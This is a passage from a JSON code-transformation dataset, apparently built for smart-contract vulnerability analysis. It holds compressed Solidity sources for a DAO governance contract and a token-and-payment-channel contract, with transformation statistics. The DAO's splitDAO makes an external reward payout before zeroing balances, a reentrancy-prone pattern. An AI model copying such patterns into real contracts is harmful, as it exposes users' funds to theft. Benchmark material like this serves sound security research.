(!isRecipientAllowed(p.recipient)) {\ncloseProposal(_proposalID);\np.creator.send(p.proposalDeposit);\nreturn;\n}\nbool proposalCheck = true;\nif (p.amount > actualBalance())\nproposalCheck = false;\nuint quorum = p.yea + p.nay;\nif (_transactionData.length >= 4 && _transactionData[0] == 0x68\n&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff\n&& _transactionData[3] == 0x1e\n&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {\nproposalCheck = false;\n}\nif (quorum >= minQuorum(p.amount)) {\nif (!p.creator.send(p.proposalDeposit))\nthrow;\nlastTimeMinQuorumMet = now;\nif (quorum > totalSupply / 5)\nminQuorumDivisor = 5;\n}\nif (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {\nif (!p.recipient.call.value(p.amount)(_transactionData))\nthrow;\np.proposalPassed = true;\n_success = true;\nif (p.recipient != address(this) && p.recipient != address(rewardAccount)\n&& p.recipient != address(DAOrewardAccount)\n&& p.recipient != address(extraBalance)\n&& p.recipient != address(curator)) {\nrewardToken[address(this)] += p.amount;\ntotalRewardToken += p.amount;\n}\n}\ncloseProposal(_proposalID);\nProposalTallied(_proposalID, _success, quorum);\n}\nfunction closeProposal(uint _proposalID) internal {\nProposal p = proposals[_proposalID];\nif (p.open)\nsumOfProposalDeposits -= p.proposalDeposit;\np.open = false;\n}\nfunction splitDAO(\nuint _proposalID,\naddress _newCurator\n) noEther onlyTokenholders returns (bool _success) {\nProposal p = proposals[_proposalID];\nif (now < p.votingDeadline\n|| now > p.votingDeadline + splitExecutionPeriod\n|| p.recipient != _newCurator\n|| !p.newCurator\n|| !p.votedYes[msg.sender]\n|| (blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0) ) {\nthrow;\n}\nif (address(p.splitData[0].newDAO) == 0) {\np.splitData[0].newDAO = createNewDAO(_newCurator);\nif (address(p.splitData[0].newDAO) == 0)\nthrow;\nif (this.balance < sumOfProposalDeposits)\nthrow;\np.splitData[0].splitBalance = actualBalance();\np.splitData[0].rewardToken = rewardToken[address(this)];\np.splitData[0].totalSupply = totalSupply;\np.proposalPassed = true;\n}\nuint fundsToBeMoved =\n(balances[msg.sender] * p.splitData[0].splitBalance) /\np.splitData[0].totalSupply;\nif (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)\nthrow;\nuint rewardTokenToBeMoved =\n(balances[msg.sender] * p.splitData[0].rewardToken) /\np.splitData[0].totalSupply;\nuint paidOutToBeMoved = DAOpaidOut[address(this)] * rewardTokenToBeMoved /\nrewardToken[address(this)];\nrewardToken[address(p.splitData[0].newDAO)] += rewardTokenToBeMoved;\nif (rewardToken[address(this)] < rewardTokenToBeMoved)\nthrow;\nrewardToken[address(this)] -= rewardTokenToBeMoved;\nDAOpaidOut[address(p.splitData[0].newDAO)] += paidOutToBeMoved;\nif (DAOpaidOut[address(this)] < paidOutToBeMoved)\nthrow;\nDAOpaidOut[address(this)] -= paidOutToBeMoved;\nTransfer(msg.sender, 0, balances[msg.sender]);\nwithdrawRewardFor(msg.sender);\ntotalSupply -= balances[msg.sender];\nbalances[msg.sender] = 0;\npaidOut[msg.sender] = 0;\nreturn true;\n}\nfunction newContract(address _newContract){\nif (msg.sender != address(this) || !allowedRecipients[_newContract]) return;\nif (!_newContract.call.value(address(this).balance)()) {\nthrow;\n}\nrewardToken[_newContract] += rewardToken[address(this)];\nrewardToken[address(this)] = 0;\nDAOpaidOut[_newContract] += DAOpaidOut[address(this)];\nDAOpaidOut[address(this)] = 0;\n}\nfunction retrieveDAOReward(bool _toMembers) external noEther returns (bool _success) {\nDAO dao = DAO(msg.sender);\nif ((rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /\ntotalRewardToken < DAOpaidOut[msg.sender])\nthrow;\nuint reward =\n(rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /\ntotalRewardToken - DAOpaidOut[msg.sender];\nif(_toMembers) {\nif (!DAOrewardAccount.payOut(dao.rewardAccount(), reward))\nthrow;\n}\nelse {\nif (!DAOrewardAccount.payOut(dao, reward))\nthrow;\n}\nDAOpaidOut[msg.sender] += reward;\nreturn true;\n}\nfunction getMyReward() noEther returns (bool _success) {\nreturn withdrawRewardFor(msg.sender);\n}\nfunction withdrawRewardFor(address _account) noEther internal returns (bool _success) {\nif ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])\nthrow;\nuint reward =\n(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];\nif (!rewardAccount.payOut(_account, reward))\nthrow;\npaidOut[_account] += reward;\nreturn true;\n}\nfunction transfer(address _to, uint256 _value) returns (bool success) {\nif (isFueled\n&& now > closingTime\n&& !isBlocked(msg.sender)\n&& transferPaidOut(msg.sender, _to, _value)\n&& super.transfer(_to, _value)) {\nreturn true;\n} else {\nthrow;\n}\n}\nfunction transferWithoutReward(address _to, uint256 _value) returns (bool success) {\nif (!getMyReward())\nthrow;\nreturn transfer(_to, _value);\n}\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\nif (isFueled\n&& now > closingTime\n&& !isBlocked(_from)\n&& transferPaidOut(_from, _to, _value)\n&& super.transferFrom(_from, _to, _value)) {\nreturn true;\n} else {\nthrow;\n}\n}\nfunction transferFromWithoutReward(\naddress _from,\naddress _to,\nuint256 _value\n) returns (bool success) {\nif (!withdrawRewardFor(_from))\nthrow;\nreturn transferFrom(_from, _to, _value);\n}\nfunction transferPaidOut(\naddress _from,\naddress _to,\nuint256 _value\n) internal returns (bool success) {\nuint transferPaidOut = paidOut[_from] * _value / balanceOf(_from);\nif (transferPaidOut > paidOut[_from])\nthrow;\npaidOut[_from] -= transferPaidOut;\npaidOut[_to] += transferPaidOut;\nreturn true;\n}\nfunction changeProposalDeposit(uint _proposalDeposit) noEther external {\nif (msg.sender != address(this) || _proposalDeposit > (actualBalance() + rewardToken[address(this)])\n/ maxDepositDivisor) {\nthrow;\n}\nproposalDeposit = _proposalDeposit;\n}\nfunction changeAllowedRecipients(address _recipient, bool _allowed) noEther external returns (bool _success) {\nif (msg.sender != curator)\nthrow;\nallowedRecipients[_recipient] = _allowed;\nAllowedRecipientChanged(_recipient, _allowed);\nreturn true;\n}\nfunction isRecipientAllowed(address _recipient) internal returns (bool _isAllowed) {\nif (allowedRecipients[_recipient]\n|| (_recipient == address(extraBalance)\n&& totalRewardToken > extraBalance.accumulatedInput()))\nreturn true;\nelse\nreturn false;\n}\nfunction actualBalance() constant returns (uint _actualBalance) {\nreturn this.balance - sumOfProposalDeposits;\n}\nfunction minQuorum(uint _value) internal constant returns (uint _minQuorum) {\nreturn totalSupply / minQuorumDivisor +\n(_value * totalSupply) / (3 * (actualBalance() + rewardToken[address(this)]));\n}\nfunction halveMinQuorum() returns (bool _success) {\nif ((lastTimeMinQuorumMet < (now - quorumHalvingPeriod) || msg.sender == curator)\n&& lastTimeMinQuorumMet < (now - minProposalDebatePeriod)) {\nlastTimeMinQuorumMet = now;\nminQuorumDivisor *= 2;\nreturn true;\n} else {\nreturn false;\n}\n}\nfunction createNewDAO(address _newCurator) internal returns (DAO _newDAO) {\nNewCurator(_newCurator);\nreturn daoCreator.createDAO(_newCurator, 0, 0, now + splitExecutionPeriod);\n}\nfunction numberOfProposals() constant returns (uint _numberOfProposals) {\nreturn proposals.length - 1;\n}\nfunction getNewDAOAddress(uint _proposalID) constant returns (address _newDAO) {\nreturn proposals[_proposalID].splitData[0].newDAO;\n}\nfunction isBlocked(address _account) internal returns (bool) {\nif (blocked[_account] == 0)\nreturn false;\nProposal p = proposals[blocked[_account]];\nif (now > p.votingDeadline) {\nblocked[_account] = 0;\nreturn false;\n} else {\nreturn true;\n}\n}\nfunction unblockMe() returns (bool) {\nreturn isBlocked(msg.sender);\n}\n}\ncontract DAO_Creator {\nfunction createDAO(\naddress _curator,\nuint _proposalDeposit,\nuint _minTokensToCreate,\nuint _closingTime\n) returns (DAO _newDAO) {\nreturn new DAO(\n_curator,\nDAO_Creator(this),\n_proposalDeposit,\n_minTokensToCreate,\n_closingTime,\nmsg.sender\n);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 221,
        "mode": "compressed",
        "original_lines": 1109,
        "transformed_lines": 658,
        "original_chars": 41974,
        "transformed_chars": 19207,
        "compression_ratio": 0.46
      },
      "error": null
    },
    {
      "original_id": "sn_ds_114",
      "transformed_id": "ss_l1_compressed_sn_ds_114",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract Token {\nuint256 public totalSupply;\nfunction balanceOf(address _owner) public constant returns (uint256 balance);\nfunction transfer(address _to, uint256 _value) public returns (bool success);\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\nfunction approve(address _spender, uint256 _value) public returns (bool success);\nfunction allowance(address _owner, address _spender) public constant returns (uint256 remaining);\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary ECTools {\nfunction recoverSigner(bytes32 _hashedMsg, string _sig) public pure returns (address) {\nrequire(_hashedMsg != 0x00);\nbytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\nbytes32 prefixedHash = keccak256(abi.encodePacked(prefix, _hashedMsg));\nif (bytes(_sig).length != 132) {\nreturn 0x0;\n}\nbytes32 r;\nbytes32 s;\nuint8 v;\nbytes memory sig = hexstrToBytes(substring(_sig, 2, 132));\nassembly {\nr := mload(add(sig, 32))\ns := mload(add(sig, 64))\nv := byte(0, mload(add(sig, 96)))\n}\nif (v < 27) {\nv += 27;\n}\nif (v < 27 || v > 28) {\nreturn 0x0;\n}\nreturn ecrecover(prefixedHash, v, r, s);\n}\nfunction isSignedBy(bytes32 _hashedMsg, string _sig, address _addr) public pure returns (bool) {\nrequire(_addr != 0x0);\nreturn _addr == recoverSigner(_hashedMsg, _sig);\n}\nfunction hexstrToBytes(string _hexstr) public pure returns (bytes) {\nuint len = bytes(_hexstr).length;\nrequire(len % 2 == 0);\nbytes memory bstr = bytes(new string(len / 2));\nuint k = 0;\nstring memory s;\nstring memory r;\nfor (uint i = 0; i < len; i += 2) {\ns = substring(_hexstr, i, i + 1);\nr = substring(_hexstr, i + 1, i + 2);\nuint p = parseInt16Char(s) * 16 + parseInt16Char(r);\nbstr[k++] = uintToBytes32(p)[31];\n}\nreturn bstr;\n}\nfunction parseInt16Char(string _char) public pure returns (uint) {\nbytes memory bresult = bytes(_char);\nif ((bresult[0] >= 48) && (bresult[0] <= 57)) {\nreturn uint(bresult[0]) - 48;\n} else if ((bresult[0] >= 65) && (bresult[0] <= 70)) {\nreturn uint(bresult[0]) - 55;\n} else if ((bresult[0] >= 97) && (bresult[0] <= 102)) {\nreturn uint(bresult[0]) - 87;\n} else {\nrevert();\n}\n}\nfunction uintToBytes32(uint _uint) public pure returns (bytes b) {\nb = new bytes(32);\nassembly {mstore(add(b, 32), _uint)}\n}\nfunction toEthereumSignedMessage(string _msg) public pure returns (bytes32) {\nuint len = bytes(_msg).length;\nrequire(len > 0);\nbytes memory prefix = \"\\x19Ethereum Signed Message:\\n\";\nreturn keccak256(abi.encodePacked(prefix, uintToString(len), _msg));\n}\nfunction uintToString(uint _uint) public pure returns (string str) {\nuint len = 0;\nuint m = _uint + 0;\nwhile (m != 0) {\nlen++;\nm /= 10;\n}\nbytes memory b = new bytes(len);\nuint i = len - 1;\nwhile (_uint != 0) {\nuint remainder = _uint % 10;\n_uint = _uint / 10;\nb[i--] = byte(48 + remainder);\n}\nstr = string(b);\n}\nfunction substring(string _str, uint _startIndex, uint _endIndex) public pure returns (string) {\nbytes memory strBytes = bytes(_str);\nrequire(_startIndex <= _endIndex);\nrequire(_startIndex >= 0);\nrequire(_endIndex <= strBytes.length);\nbytes memory result = new bytes(_endIndex - _startIndex);\nfor (uint i = _startIndex; i < _endIndex; i++) {\nresult[i - _startIndex] = strBytes[i];\n}\nreturn string(result);\n}\n}\ncontract StandardToken is Token {\nfunction transfer(address _to, uint256 _value) public returns (bool success) {\nrequire(balances[msg.sender] >= _value);\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nemit Transfer(msg.sender, _to, _value);\nreturn true;\n}\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\nrequire(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nemit Transfer(_from, _to, _value);\nreturn true;\n}\nfunction balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balances[_owner];\n}\nfunction approve(address _spender, uint256 _value) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\nstring public name;\nuint8 public decimals;\nstring public symbol;\nstring public version = 'H0.1';\nconstructor(\nuint256 _initialAmount,\nstring _tokenName,\nuint8 _decimalUnits,\nstring _tokenSymbol\n) public {\nbalances[msg.sender] = _initialAmount;\ntotalSupply = _initialAmount;\nname = _tokenName;\ndecimals = _decimalUnits;\nsymbol = _tokenSymbol;\n}\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}\n}\ncontract LedgerChannel {\nstring public constant NAME = \"Ledger Channel\";\nstring public constant VERSION = \"0.0.1\";\nuint256 public numChannels = 0;\nevent DidLCOpen (\nbytes32 indexed channelId,\naddress indexed partyA,\naddress indexed partyI,\nuint256 ethBalanceA,\naddress token,\nuint256 tokenBalanceA,\nuint256 LCopenTimeout\n);\nevent DidLCJoin (\nbytes32 indexed channelId,\nuint256 ethBalanceI,\nuint256 tokenBalanceI\n);\nevent DidLCDeposit (\nbytes32 indexed channelId,\naddress indexed recipient,\nuint256 deposit,\nbool isToken\n);\nevent DidLCUpdateState (\nbytes32 indexed channelId,\nuint256 sequence,\nuint256 numOpenVc,\nuint256 ethBalanceA,\nuint256 tokenBalanceA,\nuint256 ethBalanceI,\nuint256 tokenBalanceI,\nbytes32 vcRoot,\nuint256 updateLCtimeout\n);\nevent DidLCClose (\nbytes32 indexed channelId,\nuint256 sequence,\nuint256 ethBalanceA,\nuint256 tokenBalanceA,\nuint256 ethBalanceI,\nuint256 tokenBalanceI\n);\nevent DidVCInit (\nbytes32 indexed lcId,\nbytes32 indexed vcId,\nbytes proof,\nuint256 sequence,\naddress partyA,\naddress partyB,\nuint256 balanceA,\nuint256 balanceB\n);\nevent DidVCSettle (\nbytes32 indexed lcId,\nbytes32 indexed vcId,\nuint256 updateSeq,\nuint256 updateBalA,\nuint256 updateBalB,\naddress challenger,\nuint256 updateVCtimeout\n);\nevent DidVCClose(\nbytes32 indexed lcId,\nbytes32 indexed vcId,\nuint256 balanceA,\nuint256 balanceB\n);\nstruct Channel {\naddress[2] partyAddresses;\nuint256[4] ethBalances;\nuint256[4] erc20Balances;\nuint256[2] initialDeposit;\nuint256 sequence;\nuint256 confirmTime;\nbytes32 VCrootHash;\nuint256 LCopenTimeout;\nuint256 updateLCtimeout;\nbool isOpen;\nbool isUpdateLCSettling;\nuint256 numOpenVC;\nHumanStandardToken token;\n}\nstruct VirtualChannel {\nbool isClose;\nbool isInSettlementState;\nuint256 sequence;\naddress challenger;\nuint256 updateVCtimeout;\naddress partyA;\naddress partyB;\naddress partyI;\nuint256[2] ethBalances;\nuint256[2] erc20Balances;\nuint256[2] bond;\nHumanStandardToken token;\n}\nmapping(bytes32 => VirtualChannel) public virtualChannels;\nmapping(bytes32 => Channel) public Channels;\nfunction createChannel(\nbytes32 _lcID,\naddress _partyI,\nuint256 _confirmTime,\naddress _token,\nuint256[2] _balances\n)\npublic\npayable {\nrequire(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\nrequire(_partyI != 0x0, \"No partyI address provided to LC creation\");\nrequire(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\nChannels[_lcID].partyAddresses[0] = msg.sender;\nChannels[_lcID].partyAddresses[1] = _partyI;\nif(_balances[0] != 0) {\nrequire(msg.value == _balances[0], \"Eth balance does not match sent value\");\nChannels[_lcID].ethBalances[0] = msg.value;\n}\nif(_balances[1] != 0) {\nChannels[_lcID].token = HumanStandardToken(_token);\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\nChannels[_lcID].erc20Balances[0] = _balances[1];\n}\nChannels[_lcID].sequence = 0;\nChannels[_lcID].confirmTime = _confirmTime;\nChannels[_lcID].LCopenTimeout = now + _confirmTime;\nChannels[_lcID].initialDeposit = _balances;\nemit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n}\nfunction LCOpenTimeout(bytes32 _lcID) public {\nrequire(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\nrequire(now > Channels[_lcID].LCopenTimeout);\nif(Channels[_lcID].initialDeposit[0] != 0) {\nChannels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n}\nif(Channels[_lcID].initialDeposit[1] != 0) {\nrequire(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n}\nemit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\ndelete Channels[_lcID];\n}\nfunction joinChannel(bytes32 _lcID, uint256[2] _balances) public payable {\nrequire(Channels[_lcID].isOpen == false);\nrequire(msg.sender == Channels[_lcID].partyAddresses[1]);\nif(_balances[0] != 0) {\nrequire(msg.value == _balances[0], \"state balance does not match sent value\");\nChannels[_lcID].ethBalances[1] = msg.value;\n}\nif(_balances[1] != 0) {\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"joinChannel: token transfer failure\");\nChannels[_lcID].erc20Balances[1] = _balances[1];\n}\nChannels[_lcID].initialDeposit[0]+=_balances[0];\nChannels[_lcID].initialDeposit[1]+=_balances[1];\nChannels[_lcID].isOpen = true;\nnumChannels++;\nemit DidLCJoin(_lcID, _balances[0], _balances[1]);\n}\nfunction deposit(bytes32 _lcID, address recipient, uint256 _balance, bool isToken) public payable {\nrequire(Channels[_lcID].isOpen == true, \"Tried adding funds to a closed channel\");\nrequire(recipient == Channels[_lcID].partyAddresses[0] || recipient == Channels[_lcID].partyAddresses[1]);\nif (Channels[_lcID].partyAddresses[0] == recipient) {\nif(isToken) {\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\nChannels[_lcID].erc20Balances[2] += _balance;\n} else {\nrequire(msg.value == _balance, \"state balance does not match sent value\");\nChannels[_lcID].ethBalances[2] += msg.value;\n}\n}\nif (Channels[_lcID].partyAddresses[1] == recipient) {\nif(isToken) {\nrequire(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\nChannels[_lcID].erc20Balances[3] += _balance;\n} else {\nrequire(msg.value == _balance, \"state balance does not match sent value\");\nChannels[_lcID].ethBalances[3] += msg.value;\n}\n}\nemit DidLCDeposit(_lcID, recipient, _balance, isToken);\n}\nfunction consensusCloseChannel(\nbytes32 _lcID,\nuint256 _sequence,\nuint256[4] _balances,\nstring _sigA,\nstring _sigI\n)\npublic {\nrequire(Channels[_lcID].isOpen == true);\nuint256 totalEthDeposit = Channels[_lcID].initialDeposit[0] + Channels[_lcID].ethBalances[2] + Channels[_lcID].ethBalances[3];\nuint256 totalTokenDeposit = Channels[_lcID].initialDeposit[1] + Channels[_lcID].erc20Balances[2] + Channels[_lcID].erc20Balances[3];\nrequire(totalEthDeposit == _balances[0] + _balances[1]);\nrequire(totalTokenDeposit == _balances[2] + _balances[3]);\nbytes32 _state = keccak256(\nabi.encodePacked(\n_lcID,\ntrue,\n_sequence,\nuint256(0),\nbytes32(0x0),\nChannels[_lcID].partyAddresses[0],\nChannels[_lcID].partyAddresses[1],\n_balances[0],\n_balances[1],\n_balances[2],\n_balances[3]\n)\n);\nrequire(Channels[_lcID].partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\nrequire(Channels[_lcID].partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\nChannels[_lcID].isOpen = false;\nif(_balances[0] != 0 || _balances[1] != 0) {\nChannels[_lcID].partyAddresses[0].transfer(_balances[0]);\nChannels[_lcID].partyAddresses[1].transfer(_balances[1]);\n}\nif(_balances[2] != 0 || _balances[3] != 0) {\nrequire(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], _balances[2]),\"happyCloseChannel: token transfer failure\");\nrequire(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[1], _balances[3]),\"happyCloseChannel: token transfer failure\");\n}\nnumChannels--;\nemit DidLCClose(_lcID, _sequence, _balances[0], _balances[1], _balances[2], _balances[3]);\n}\nfunction updateLCstate(\nbytes32 _lcID,\nuint256[6] updateParams,\nbytes32 _VCroot,\nstring _sigA,\nstring _sigI\n)\npublic {\nChannel storage channel = Channels[_lcID];\nrequire(channel.isOpen);\nrequire(channel.sequence < updateParams[0]);\nrequire(channel.ethBalances[0] + channel.ethBalances[1] >= updateParams[2] + updateParams[3]);\nrequire(channel.erc20Balances[0] + channel.erc20Balances[1] >= updateParams[4] + updateParams[5]);\nif(channel.isUpdateLCSettling == true) {\nrequire(channel.updateLCtimeout > now);\n}\nbytes32 _state = keccak256(\nabi.encodePacked(\n_lcID,\nfalse,\nupdateParams[0],\nupdateParams[1],\n_VCroot,\nchannel.partyAddresses[0],\nchannel.partyAddresses[1],\nupdateParams[2],\nupdateParams[3],\nupdateParams[4],\nupdateParams[5]\n)\n);\nrequire(channel.partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\nrequire(channel.partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\nchannel.sequence = updateParams[0];\nchannel.numOpenVC = updateParams[1];\nchannel.ethBalances[0] = updateParams[2];\nchannel.ethBalances[1] = updateParams[3];\nchannel.erc20Balances[0] = updateParams[4];\nchannel.erc20Balances[1] = updateParams[5];\nchannel.VCrootHash = _VCroot;\nchannel.isUpdateLCSettling = true;\nchannel.updateLCtimeout = now + channel.confirmTime;\nemit DidLCUpdateState (\n_lcID,\nupdateParams[0],\nupdateParams[1],\nupdateParams[2],\nupdateParams[3],\nupdateParams[4],\nupdateParams[5],\n_VCroot,\nchannel.updateLCtimeout\n);\n}\nfunction initVCstate(\nbytes32 _lcID,\nbytes32 _vcID,\nbytes _proof,\naddress _partyA,\naddress _partyB,\nuint256[2] _bond,\nuint256[4] _balances,\nstring sigA\n)\npublic {\nrequire(Channels[_lcID].isOpen, \"LC is closed.\");\nrequire(!virtualChannels[_vcID].isClose, \"VC is closed.\");\nrequire(Channels[_lcID].updateLCtimeout < now, \"LC timeout not over.\");\nrequire(virtualChannels[_vcID].updateVCtimeout == 0);\nbytes32 _initState = keccak256(\nabi.encodePacked(_vcID, uint256(0), _partyA, _partyB, _bond[0], _bond[1], _balances[0], _balances[1], _balances[2], _balances[3])\n);\nrequire(_partyA == ECTools.recoverSigner(_initState, sigA));\nrequire(_isContained(_initState, _proof, Channels[_lcID].VCrootHash) == true);\nvirtualChannels[_vcID].partyA = _partyA;\nvirtualChannels[_vcID].partyB = _partyB;\nvirtualChannels[_vcID].sequence = uint256(0);\nvirtualChannels[_vcID].ethBalances[0] = _balances[0];\nvirtualChannels[_vcID].ethBalances[1] = _balances[1];\nvirtualChannels[_vcID].erc20Balances[0] = _balances[2];\nvirtualChannels[_vcID].erc20Balances[1] = _balances[3];\nvirtualChannels[_vcID].bond = _bond;\nvirtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\nvirtualChannels[_vcID].isInSettlementState = true;\nemit DidVCInit(_lcID, _vcID, _proof, uint256(0), _partyA, _partyB, _balances[0], _balances[1]);\n}\nfunction settleVC(\nbytes32 _lcID,\nbytes32 _vcID,\nuint256 updateSeq,\naddress _partyA,\naddress _partyB,\nuint256[4] updateBal,\nstring sigA\n)\npublic {\nrequire(Channels[_lcID].isOpen, \"LC is closed.\");\nrequire(!virtualChannels[_vcID].isClose, \"VC is closed.\");\nrequire(virtualChannels[_vcID].sequence < updateSeq, \"VC sequence is higher than update sequence.\");\nrequire(\nvirtualChannels[_vcID].ethBalances[1] < updateBal[1] && virtualChannels[_vcID].erc20Balances[1] < updateBal[3],\n\"State updates may only increase recipient balance.\"\n);\nrequire(\nvirtualChannels[_vcID].bond[0] == updateBal[0] + updateBal[1] &&\nvirtualChannels[_vcID].bond[1] == updateBal[2] + updateBal[3],\n\"Incorrect balances for bonded amount\");\nrequire(Channels[_lcID].updateLCtimeout < now);\nbytes32 _updateState = keccak256(\nabi.encodePacked(\n_vcID,\nupdateSeq,\n_partyA,\n_partyB,\nvirtualChannels[_vcID].bond[0],\nvirtualChannels[_vcID].bond[1],\nupdateBal[0],\nupdateBal[1],\nupdateBal[2],\nupdateBal[3]\n)\n);\nrequire(virtualChannels[_vcID].partyA == ECTools.recoverSigner(_updateState, sigA));\nvirtualChannels[_vcID].challenger = msg.sender;\nvirtualChannels[_vcID].sequence = updateSeq;\nvirtualChannels[_vcID].ethBalances[0] = updateBal[0];\nvirtualChannels[_vcID].ethBalances[1] = updateBal[1];\nvirtualChannels[_vcID].erc20Balances[0] = updateBal[2];\nvirtualChannels[_vcID].erc20Balances[1] = updateBal[3];\nvirtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\nemit DidVCSettle(_lcID, _vcID, updateSeq, updateBal[0], updateBal[1], msg.sender, virtualChannels[_vcID].updateVCtimeout);\n}\nfunction closeVirtualChannel(bytes32 _lcID, bytes32 _vcID) public {\nrequire(Channels[_lcID].isOpen, \"LC is closed.\");\nrequire(virtualChannels[_vcID].isInSettlementState, \"VC is not in settlement state.\");\nrequire(virtualChannels[_vcID].updateVCtimeout < now, \"Update vc timeout has not elapsed.\");\nrequire(!virtualChannels[_vcID].isClose, \"VC is already closed\");\nChannels[_lcID].numOpenVC--;\nvirtualChannels[_vcID].isClose = true;\nif(virtualChannels[_vcID].partyA == Channels[_lcID].partyAddresses[0]) {\nChannels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[0];\nChannels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[1];\nChannels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[0];\nChannels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[1];\n} else if (virtualChannels[_vcID].partyB == Channels[_lcID].partyAddresses[0]) {\nChannels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[1];\nChannels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[0];\nChannels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[1];\nChannels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[0];\n}\nemit DidVCClose(_lcID, _vcID, virtualChannels[_vcID].erc20Balances[0], virtualChannels[_vcID].erc20Balances[1]);\n}\nfunction byzantineCloseChannel(bytes32 _lcID) public {\nChannel storage channel = Channels[_lcID];\nrequire(channel.isOpen, \"Channel is not open\");\nrequire(channel.isUpdateLCSettling == true);\nrequire(channel.numOpenVC == 0);\nrequire(channel.updateLCtimeout < now, \"LC timeout over.\");\nuint256 totalEthDeposit = channel.initialDeposit[0] + channel.ethBalances[2] + channel.ethBalances[3];\nuint256 totalTokenDeposit = channel.initialDeposit[1] + channel.erc20Balances[2] + channel.erc20Balances[3];\nuint256 possibleTotalEthBeforeDeposit = channel.ethBalances[0] + channel.ethBalances[1];\nuint256 possibleTotalTokenBeforeDeposit = channel.erc20Balances[0] + channel.erc20Balances[1];\nif(possibleTotalEthBeforeDeposit < totalEthDeposit) {\nchannel.ethBalances[0]+=channel.ethBalances[2];\nchannel.ethBalances[1]+=channel.ethBalances[3];\n} else {\nrequire(possibleTotalEthBeforeDeposit == totalEthDeposit);\n}\nif(possibleTotalTokenBeforeDeposit < totalTokenDeposit) {\nchannel.erc20Balances[0]+=channel.erc20Balances[2];\nchannel.erc20Balances[1]+=channel.erc20Balances[3];\n} else {\nrequire(possibleTotalTokenBeforeDeposit == totalTokenDeposit);\n}\nuint256 ethbalanceA = channel.ethBalances[0];\nuint256 ethbalanceI = channel.ethBalances[1];\nuint256 tokenbalanceA = channel.erc20Balances[0];\nuint256 tokenbalanceI = channel.erc20Balances[1];\nchannel.ethBalances[0] = 0;\nchannel.ethBalances[1] = 0;\nchannel.erc20Balances[0] = 0;\nchannel.erc20Balances[1] = 0;\nif(ethbalanceA != 0 || ethbalanceI != 0) {\nchannel.partyAddresses[0].transfer(ethbalanceA);\nchannel.partyAddresses[1].transfer(ethbalanceI);\n}\nif(tokenbalanceA != 0 || tokenbalanceI != 0) {\nrequire(\nchannel.token.transfer(channel.partyAddresses[0], tokenbalanceA),\n\"byzantineCloseChannel: token transfer failure\"\n);\nrequire(\nchannel.token.transfer(channel.partyAddresses[1], tokenbalanceI),\n\"byzantineCloseChannel: token transfer failure\"\n);\n}\nchannel.isOpen = false;\nnumChannels--;\nemit 